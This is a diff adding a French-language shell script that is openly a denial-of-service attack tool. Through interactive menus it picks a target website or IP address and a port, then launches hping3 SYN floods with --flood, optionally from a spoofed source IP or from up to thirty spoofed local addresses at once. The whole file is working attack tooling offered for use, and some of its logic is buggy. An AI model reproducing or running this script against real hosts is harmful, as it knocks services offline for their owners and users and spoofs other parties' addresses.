@@ -1,0 +1,424 @@
+#!/bin/sh
+
+                   
+banner() 
+{
+	printf "\n"
+	printf "\e[1;77m           ██████╗    ██████╗   ███████╗    \e[0m\n"
+	printf "\e[1;77m           ██╔══██╗  ██╔═══██╗  ██╔════╝    \e[0m\n"
+	printf "\e[1;77m           ██║  ██║  ██║   ██║  ███████╗    \e[0m\n"
+	printf "\e[1;77m           ██║  ██║  ██║   ██║  ╚════██║    \e[0m\n"
+	printf "\e[1;77m           ██████╔╝  ╚██████╔╝  ███████║    \e[0m\n"
+	printf "\e[1;77m           ╚═════╝    ╚═════╝   ╚══════╝    v1.0\e[0m\n"
+	printf "\n"
+	printf "\e[1;93m  .:.:.\e[0m\e[1;77m Outil d'attaque par deni de service \e[0m\e[1;93m.:.:.\e[0m\n\n"
+}
+
+
+testad()
+{
+	ad=$ad
+	wget -q --spider $ad
+	if [ $? -eq 0 ]; then 
+		echo -e -n "${blanc}[${orange}*${blanc}] Adresse cible: ${orange} $ad ${blanc}"
+		menu2 $ad
+	else
+		printf "\e${blanc}[${orange}!${blanc}] ${orange}Adresse invalide !${blanc}\n\n"
+		menu_bis
+	fi
+}
+
+
+testip()
+{	
+	ip=$ip
+	#if [ ! -z $IP_CIBLE ] && [[ `echo $IP_CIBLE | grep -E '^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-4]|2[0-4][0-9]|[01]?[1-9][0-9]?)$'` = $IP_CIBLE ]]; 
+	#if [ $? -eq 0 ];then 	
+	ping -q -w1 -c1 $ip &>/dev/null && pingg=ok || pingg=null
+	if [ $pingg == "ok" ];
+		then 	
+			echo -e -n "${blanc}[${orange}*${blanc}] Adresse cible : ${orange}$ip ${blanc}\n"
+			menu2 $ip
+		else
+ 			printf "\e${blanc}[${orange}!${blanc}] ${orange}Adresse invalide !${blanc}\n\n"
+			menu_bis
+	fi
+}
+
+
+dos()
+{
+	sleep 1
+	ip=$ip
+	port=$2
+	spoof=$spoof
+	nb=$nb
+	clear
+	banner
+	printf "${blanc}[${orange}*${blanc}] Adresse cible : ${orange}$ip ${blanc}\n"
+	printf "${blanc}[${orange}*${blanc}] Port(s) : ${orange}$port ${blanc}\n"
+	if [[ $spoof == mult ]]; then
+			printf "${blanc}[${orange}*${blanc}] Attaque effectuée depuis ${orange}$nb adresses ip locales ${blanc}\n\n\n"
+		else
+			printf "${blanc}[${orange}*${blanc}] Attaque effectuée depuis l'adresse : ${orange}$spoof ${blanc}\n\n\n"
+		fi
+	sleep 1
+	printf "\e[1;93m  .:.:.\e[0m\e[1;77m       Début de l'attaque DOS        \e[0m\e[1;93m.:.:.\e[0m\n\n"
+	if [[ $port == "80/443" ]]; then 
+			if [[ $spoof == mult ]]; then
+				hpingx_para $ip $nb
+			else
+				hping_para $ip $spoof
+			fi
+		else
+			if [[ $spoof == mult ]]; then
+				hpingx $ip $port $nb
+			else
+				hping $ip $port $spoof 
+			fi
+	fi
+}
+
+
+dos2()
+{
+	printf "\e${blanc}[${orange}!${blanc}] ${orange}Arrêt de l'attaque ${blanc}\n\n"
+	sleep 1
+	echo -e -n "${blanc}[${orange}*${blanc}] Entrer 'r' pour revenir au menu ou un caractère aléatoire  pour quitter : ${blanc}"
+	while read retour
+	do	
+		if [ $retour == "r" ]; then
+			printf "\n\n\e[1;93m  .:.:.\e[0m\e[1;77m            Retour au menu            \e[0m\e[1;93m.:.:.\e[0m\n\n"
+			clear
+			banner
+			menu
+		else 
+			echo ""
+			sleep 1
+			clear
+			exit 1
+		fi	
+	done
+}
+
+
+hping()
+{
+	ip=$ip
+	port=$port
+	spoof=$spoof
+	sudo hping3 -S $ip -a $spoof -p $port --flood >/dev/null 2> /dev/null & 
+	printf "${blanc}[${orange}*${blanc}] Appuyer sur 'Entrée' pour arrêter l'attaque ${blanc}"
+	while read stop
+	do
+	    let "pid=$!"
+	    sudo kill $pid
+	    let "pid=pid+1"
+	    sudo kill $pid
+	    let "pid=pid-1"
+	    sudo kill $pid
+	    dos2
+	done
+}
+
+
+hpingx()
+{
+  ip=$ip
+  port=$port
+  nb=$nb
+  printf "${blanc}[${orange}*${blanc}] Appuyer sur 'Entrée' pour arrêter l'attaque ${blanc}"
+  inc=0
+  while ((inc!=nb))
+  do
+      sudo hping3 -S $ip -a 192.168.0.$inc -p 80 --flood >/dev/null 2> /dev/null & 
+      let "inc=inc+1"
+  done
+  inc=0
+  while read stop
+  do
+    let "pid=$!"
+    let "pid=pid-2"
+    inc2=0
+    while ((inc2!=nb+2))
+    do
+      let "pid=pid+1"
+      sudo kill $pid >/dev/null 2> /dev/null & 
+      let "inc2=inc2+1"
+    done
+    dos2
+  done
+}
+
+
+hping_para()
+{
+  ip=$ip
+  port=$port
+  nb=$nb
+  let "$nb=$nb/2"
+  printf "${blanc}[${orange}*${blanc}] Appuyer sur 'Entrée' pour arrêter l'attaque ${blanc}"
+  inc=0
+  while ((inc!=nb))
+  do
+      sudo hping3 -S $ip -a 192.168.0.$inc -p 80 --flood >/dev/null 2> /dev/null & 
+      sudo hping3 -S $ip -a 192.168.0.$inc -p 443 --flood >/dev/null 2> /dev/null & 
+      let "inc=inc+1"
+  done
+  inc=0
+  while read stop
+  do
+    let "pid=$!"
+    let "pid=pid-2"
+    inc2=0
+    while ((inc2!=nb+2))
+    do
+      let "pid=pid+1"
+      sudo kill $pid >/dev/null 2> /dev/null & 
+      let "inc2=inc2+1"
+    done
+    dos2
+  done
+}
+
+
+hpingx_para()
+{
+	ip=$ip
+	sudo hping3 -S $ip -a 192.168.0.1 -p 80 --flood >/dev/null 2> /dev/null & 
+	sudo hping3 -S $ip -a 192.168.0.1 -p 443 --flood >/dev/null 2> /dev/null &
+	printf "${blanc}[${orange}*${blanc}] Appuyer sur 'Entrée' pour arrêter l'attaque ${blanc}"
+	while read stop
+	do
+	    let "pid=$!"
+	    sudo kill $pid
+	    let "pid=pid-1"
+	    sudo kill $pid
+	    let "pid=pid+2"
+	    sudo kill $pid
+	    let "pid=pid+1"
+	    sudo kill $pid
+	     let "pid=pid-1"
+	    sudo kill $pid
+	    let "pid=pid-2"
+	    sudo kill $pid
+	    dos2
+	done
+}
+
+
+spinner()
+{
+    local pid=$!
+    local delay=0.75
+    local spinstr='|/-\'
+    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
+        local temp=${spinstr#?}
+        printf " [%c]  " "$spinstr"
+        local spinstr=$temp${spinstr%"$temp"}
+        sleep $delay
+        printf "\b\b\b\b\b\b"
+    done
+    printf "    \b\b\b\b"
+}
+
+
+menu() 
+{
+	sleep 1
+	printf "\e${blanc}[${orange}1${blanc}] Cibler un site web \n"      
+	printf "\e${blanc}[${orange}2${blanc}] Cibler une adresse ip \n"      
+	printf "\e${blanc}[${orange}3${blanc}] Quitter le programme \n\n"
+	menu_bis
+}
+
+
+menu_bis()
+{
+	read -p $'\e[1;37m[\e[0;33m*\e[1;37m] Choisir une option : ' option 
+	if [[ $option == 1 ]]; then
+		echo -e -n "${blanc}[${orange}*${blanc}] Entrer l'adresse du site: ${blanc}"
+		read ip
+		testip $ip
+
+	elif [[ $option == 2 ]]; then
+		echo -e -n "${blanc}[${orange}*${blanc}] Entrer l'adresse ip : ${blanc}"
+		read ip
+		testip $ip
+
+	elif [[ $option == 3 ]]; then
+		echo ""
+		sleep 1
+		clear
+		exit 1
+
+	else
+		printf "\e${blanc}[${orange}!${blanc}] ${orange}Option invalide !${blanc}\n\n"
+		sleep 1
+		menu
+	fi
+}
+
+
+menu2() 
+{
+	sleep 1
+	ip=$ip
+	clear
+	banner
+	printf "${blanc}[${orange}*${blanc}] Adresse cible : ${orange}$ip ${blanc}\n\n\n"
+	sleep 1
+	printf "\e[1;93m  .:.:.\e[0m\e[1;77m         Choix du/des ports          \e[0m\e[1;93m.:.:.\e[0m\n\n"
+	printf "\e${blanc}[${orange}1${blanc}] Cibler le port 80 (http) \n"      
+	printf "\e${blanc}[${orange}2${blanc}] Cibler le port 443 (https) \n"
+	printf "\e${blanc}[${orange}3${blanc}] Cibler les ports 80 et 443 (http et https) \n"
+	printf "\e${blanc}[${orange}4${blanc}] Cibler un autre port\n"
+	printf "\e${blanc}[${orange}5${blanc}] Revenir au choix du site \n"      
+	printf "\e${blanc}[${orange}6${blanc}] Quitter le programme \n\n"
+	read -p $'\e[1;37m[\e[0;33m*\e[1;37m] Choisir une option : ' option 
+
+	case $option in 
+		1) 
+		echo -e -n "${blanc}[${orange}*${blanc}] Port : ${orange}80 (http) ${blanc}\n"
+		port=80
+		menu3 $ip $port;;
+
+		2)
+		echo -e -n "${blanc}[${orange}*${blanc}] Port : ${orange}443 (https) ${blanc}\n"
+		port=443
+		menu3 $ip $port;;
+
+		3)
+		echo -e -n "${blanc}[${orange}*${blanc}] Ports : ${orange}80 et 443 (http et https) ${blanc}\n"
+		port=80/443
+		menu3 $ip $port;;
+
+		4)
+		read -p $'\e[1;37m[\e[0;33m*\e[1;37m] Choisir un port : ' port
+		echo -e -n "${blanc}[${orange}*${blanc}] Port :${orange} $port ${blanc}\n"
+		menu3 $ip $port;;
+
+		5)
+		clear
+		banner
+		menu;;
+
+		6)
+		echo ""
+		sleep 1
+		clear
+		exit 1;;
+
+		*)
+		printf "\e${blanc}[${orange}!${blanc}] ${orange}Option invalide !${blanc}\n\n"
+		sleep 1
+		menu2 $ip;;
+	esac
+}
+
+
+menu3() 
+{
+	sleep 1
+	ip=$ip
+	port=$port
+	clear
+	banner
+	printf "${blanc}[${orange}*${blanc}] Adresse cible : ${orange}$ip ${blanc}\n"
+	printf "${blanc}[${orange}*${blanc}] Port : ${orange}$port ${blanc}\n\n\n"
+	sleep 1
+	printf "\e[1;93m  .:.:.\e[0m\e[1;77m      Spoofing et agressivité       \e[0m\e[1;93m.:.:.\e[0m\n\n"
+	printf "\e${blanc}[${orange}1${blanc}] Lancer une attaque (SYN FLOOD) depuis l'adresse ip locale authentique \n"      
+	printf "\e${blanc}[${orange}2${blanc}] Lancer une attaque (SYN FLOOD) depuis une autre adresse ip \n"
+	printf "\e${blanc}[${orange}3${blanc}] Lancer une attaque (SYN FLOOD) depuis des adresses ip multiples \n"
+	printf "\e${blanc}[${orange}4${blanc}] Revenir au choix du/des ports \n"  
+	printf "\e${blanc}[${orange}5${blanc}] Revenir au choix du site \n"      
+	printf "\e${blanc}[${orange}6${blanc}] Quitter le programme \n\n"
+	read -p $'\e[1;37m[\e[0;33m*\e[1;37m] Choisir une option : ' option 
+
+	case $option in 
+		1) 
+
+		read -p $'\e[1;37m[\e[0;33m*\e[1;37m] Ecrire le nom de votre interface réseau (Entrer pour séléctionner wlan0): ' interface
+		if [[ $interface == "" ]]; then
+			command ip -f inet -o addr show $wlan0 > /dev/null 2>&1 || { printf >&2 "\e\n${blanc}[${orange}!${blanc}] ${orange}Cette interface n'existe pas, entrer 'ifconfig' dans un terminal pour voir celles disponibles !${blanc}\n"; menu3 $ip $port; }
+		    spoof=$(ip -f inet -o addr show wlan0 | cut -d\  -f 7 | cut -d/ -f 1)
+		else
+		    command ip -f inet -o addr show $interface > /dev/null 2>&1 || { printf >&2 "\e\n${blanc}[${orange}!${blanc}] ${orange}Cette interface n'existe pas, entrer 'ifconfig' dans un terminal pour voir celles disponibles !${blanc}\n"; menu3 $ip $port; }
+		    spoof=$(ip -f inet -o addr show $interface | cut -d\  -f 7 | cut -d/ -f 1)
+		fi
+		echo -e -n "${blanc}[${orange}*${blanc}] Lancé depuis l'adresse :${orange} $spoof ${blanc}\n"
+		nb=1
+		dos $ip $port $spoof $nb;;
+
+		2)
+		read -p $'\e[1;37m[\e[0;33m*\e[1;37m] Choisir une adresse ip : ' spoof
+		echo -e -n "${blanc}[${orange}*${blanc}] Adresse ip spoofé :${orange} $spoof ${blanc}\n"
+		nb=1
+		dos $ip $port $spoof $nb;;
+
+		3) 
+		read -p $'\e[1;37m[\e[0;33m*\e[1;37m] Choisir le nombre de processus à lancer (entre 1 et 30) : ' nb
+		if [[ $nb != [1-30] ]]; then 
+			spoof=mult
+			dos $ip $port $spoof $nb		
+		else
+			printf "\e\n${blanc}[${orange}!${blanc}] ${orange}Choisir un nomre entre 1 et 35 !${blanc}\n"; menu3;
+		fi;;
+
+		4)
+		menu2 $ip;;
+
+		5)
+		clear
+		banner
+		menu;;
+
+		6)
+		echo ""
+		sleep 1
+		clear
+		exit 1;;
+
+		*)
+		printf "\e${blanc}[${orange}!${blanc}] ${orange}Option invalide !${blanc}\n\n"
+		sleep 1
+		menu3 $ip;;
+	esac
+}
+
+
+# Main body of script starts here
+
+
+blanc='\e[1;37m'
+orange='\e[0;33m'
+
+clear
+command cat /usr/local/bin/DOS/var > /dev/null 2>&1 || sudo bash install; exit 1;
+requirement=$(cat /usr/local/bin/DOS/var)
+case $requirement in
+	0) 
+	sudo bash install
+	exit 1;;
+
+	1)
+	banner
+	menu
+	printf "\e\n\n\n ${orange}Erreur ${blanc}";;
+
+	*)
+	banner
+	printf "\e\n${blanc}[${orange}!${blanc}] ${orange}Fichier 'var' corrompu ${blanc}\n"
+	sudo rm /usr/local/bin/DOS/var
+	sudo echo "0">/usr/local/bin/DOS/var
+	sleep 2 
+	printf "\e${blanc}[${orange}!${blanc}] ${orange}Réinstallation du programme ${blanc}"
+	sleep 3
+	clear
+	sudo bash install;;
+esac
+
+
+
+
